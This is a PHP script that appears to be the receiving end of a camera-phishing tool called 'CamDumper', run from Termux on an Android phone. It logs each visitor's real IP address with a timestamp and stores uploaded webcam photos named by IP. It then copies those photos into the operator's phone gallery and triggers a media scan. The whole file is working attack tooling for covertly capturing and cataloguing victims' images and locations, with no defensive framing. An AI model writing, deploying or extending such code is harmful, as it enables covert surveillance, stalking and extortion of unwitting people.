<?php
function getRealIP() {
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (isset($_SERVER['HTTP_X_REAL_IP'])) {
        return $_SERVER['HTTP_X_REAL_IP'];
    }
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    if (isset($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    }
    return '0.0.0.0';
}

$ip = getRealIP();
$safe_ip = preg_replace('/[^0-9.]/', '', $ip);
$timestamp = time();
$date = date('Y-m-d H:i:s');

// IP'yi logla
file_put_contents('captured_files/ip.txt', 
    $ip . ' - ' . $date . "\n", 
    FILE_APPEND
);

if (isset($_FILES['photo'])) {
    $filename = 'captured_files/' . $safe_ip . '_' . $timestamp . '.png';
    
    if (move_uploaded_file($_FILES['photo']['tmp_name'], $filename)) {
        // DCIM/Camera'ya kopyala (galeri)
        $galery_path = '/data/data/com.termux/files/home/storage/shared/DCIM/Camera/' . $safe_ip . '_' . $timestamp . '.png';
        copy($filename, $galery_path);
        
        // Pictures'a da kopyala
        $pictures_path = '/data/data/com.termux/files/home/storage/shared/Pictures/CamDumper/' . $safe_ip . '_' . $timestamp . '.png';
        copy($filename, $pictures_path);
        
        // Medya taraması başlat
        exec('termux-media-scan ' . $galery_path . ' 2>/dev/null &');
        
        echo 'OK';
    } else {
        echo 'ERROR';
    }
} else {
    echo 'NO_FILE';
}
?>
